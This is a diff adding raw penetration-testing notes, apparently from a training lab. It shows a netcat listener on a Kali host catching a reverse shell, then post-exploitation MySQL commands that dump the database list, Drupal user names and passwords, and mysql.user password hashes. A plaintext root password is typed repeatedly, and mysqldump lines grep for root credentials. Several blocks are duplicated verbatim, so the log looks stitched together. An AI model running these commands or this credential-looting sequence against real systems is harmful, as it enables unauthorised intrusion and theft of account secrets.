@@ -1,0 +1,151 @@
+mysql -u dbuser -p -D drupaldb -e “show tables; select * from users; select name,pass from users;”
+
+$ mysql -u root -p -e "show databases" 
+Enter password: 99bbVDdorGzfZJun
+Database
+information_schema
+cuppa
+mysql
+performance_schema
+sys
+
+$ mysql -u root -p -D mysql -e "show tables"
+Enter password: 99bbVDdorGzfZJun
+Tables_in_mysql
+columns_priv
+db
+engine_cost
+event
+func
+general_log
+gtid_executed
+help_category
+help_keyword
+help_relation
+help_topic
+innodb_index_stats
+innodb_table_stats
+ndb_binlog_index
+plugin
+proc
+procs_priv
+proxies_priv
+server_cost
+servers
+slave_master_info
+slave_relay_log_info
+slave_worker_info
+slow_log
+tables_priv
+time_zone
+time_zone_leap_second
+time_zone_name
+time_zone_transition
+time_zone_transition_type
+user
+
+kali@kali:~$ sudo nc -lnvp 1937
+listening on [any] 1937 ...
+connect to [192.168.119.214] from (UNKNOWN) [10.11.1.116] 45976
+/bin/sh: 0: can't access tty; job control turned off
+$ mysql -u root -p -D mysql -e "show tables; select * from user;"
+Enter password: 99bbVDdorGzfZJun
+Tables_in_mysql
+columns_priv
+db
+engine_cost
+event
+func
+general_log
+gtid_executed
+help_category
+help_keyword
+help_relation
+help_topic
+innodb_index_stats
+innodb_table_stats
+ndb_binlog_index
+plugin
+proc
+procs_priv
+proxies_priv
+server_cost
+servers
+slave_master_info
+slave_relay_log_info
+slave_worker_info
+slow_log
+tables_priv
+time_zone
+time_zone_leap_second
+time_zone_name
+time_zone_transition
+time_zone_transition_type
+user
+Host    User    Select_priv     Insert_priv     Update_priv     Delete_priv     Create_priv     Drop_priv      Reload_priv      Shutdown_priv   Process_priv    File_priv       Grant_priv      References_priv Index_priv     Alter_priv       Show_db_priv    Super_priv      Create_tmp_table_priv   Lock_tables_priv        Execute_priv   Repl_slave_priv  Repl_client_priv        Create_view_priv        Show_view_priv  Create_routine_priv     Alter_routine_priv      Create_user_priv        Event_priv      Trigger_priv    Create_tablespace_priv  ssl_type       ssl_cipher       x509_issuer     x509_subject    max_questions   max_updates     max_connections max_user_connections    plugin  authentication_string   password_expired        password_last_changed   password_lifetime      account_locked
+localhost       root    Y       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y      YY       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y      YY       Y                                       0       0       0       0       mysql_native_password   *367A9E1D1A02306FA346911719B1E6015E1CA896       N       2019-12-31 02:35:18     NULL    N
+localhost       mysql.session   N       N       N       N       N       N       N       N       N       N      NN       N       N       N       Y       N       N       N       N       N       N       N       N       N      NN       N       N                                       0       0       0       0       mysql_native_password  *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE        N       2019-12-31 02:35:18     NULL    Y
+localhost       mysql.sys       N       N       N       N       N       N       N       N       N       N      NN       N       N       N       N       N       N       N       N       N       N       N       N       N      NN       N       N                                       0       0       0       0       mysql_native_password  *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE        N       2019-12-31 02:35:18     NULL    Y
+localhost       debian-sys-maint        Y       Y       Y       Y       Y       Y       Y       Y       Y      YY       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y      YY       Y       Y       Y                                       0       0       0       0       mysql_native_password   *46B97E4DF2D8B3BEA986DA66A29265872FDC23F8       N       2019-12-31 02:35:18     NULL    N
+$ 
+
+kali@kali:~$ sudo nc -lnvp 1937
+listening on [any] 1937 ...
+connect to [192.168.119.214] from (UNKNOWN) [10.11.1.116] 45976
+/bin/sh: 0: can't access tty; job control turned off
+$ mysql -u root -p -D mysql -e "show tables; select * from user;"
+Enter password: 99bbVDdorGzfZJun
+Tables_in_mysql
+columns_priv
+db
+engine_cost
+event
+func
+general_log
+gtid_executed
+help_category
+help_keyword
+help_relation
+help_topic
+innodb_index_stats
+innodb_table_stats
+ndb_binlog_index
+plugin
+proc
+procs_priv
+proxies_priv
+server_cost
+servers
+slave_master_info
+slave_relay_log_info
+slave_worker_info
+slow_log
+tables_priv
+time_zone
+time_zone_leap_second
+time_zone_name
+time_zone_transition
+time_zone_transition_type
+user
+Host    User    Select_priv     Insert_priv     Update_priv     Delete_priv     Create_priv     Drop_priv      Reload_priv      Shutdown_priv   Process_priv    File_priv       Grant_priv      References_priv Index_priv     Alter_priv       Show_db_priv    Super_priv      Create_tmp_table_priv   Lock_tables_priv        Execute_priv   Repl_slave_priv  Repl_client_priv        Create_view_priv        Show_view_priv  Create_routine_priv     Alter_routine_priv      Create_user_priv        Event_priv      Trigger_priv    Create_tablespace_priv  ssl_type       ssl_cipher       x509_issuer     x509_subject    max_questions   max_updates     max_connections max_user_connections    plugin  authentication_string   password_expired        password_last_changed   password_lifetime      account_locked
+localhost       root    Y       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y      YY       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y      YY       Y                                       0       0       0       0       mysql_native_password   *367A9E1D1A02306FA346911719B1E6015E1CA896       N       2019-12-31 02:35:18     NULL    N
+localhost       mysql.session   N       N       N       N       N       N       N       N       N       N      NN       N       N       N       Y       N       N       N       N       N       N       N       N       N      NN       N       N                                       0       0       0       0       mysql_native_password  *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE        N       2019-12-31 02:35:18     NULL    Y
+localhost       mysql.sys       N       N       N       N       N       N       N       N       N       N      NN       N       N       N       N       N       N       N       N       N       N       N       N       N      NN       N       N                                       0       0       0       0       mysql_native_password  *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE        N       2019-12-31 02:35:18     NULL    Y
+localhost       debian-sys-maint        Y       Y       Y       Y       Y       Y       Y       Y       Y      YY       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y       Y      YY       Y       Y       Y                                       0       0       0       0       mysql_native_password   *46B97E4DF2D8B3BEA986DA66A29265872FDC23F8       N       2019-12-31 02:35:18     NULL    N
+$ 
+
+Enter password: 99bbVDdorGzfZJun
+Database
+information_schema
+cuppa
+mysql
+performance_schema
+sys
+
+
+mysqldump -u root -p <> | grep root | less -S
+mysqldump -u root -p mysql | grep root | less -S
+mysqldump -u root -p sys | grep root | less -S
+
+
+
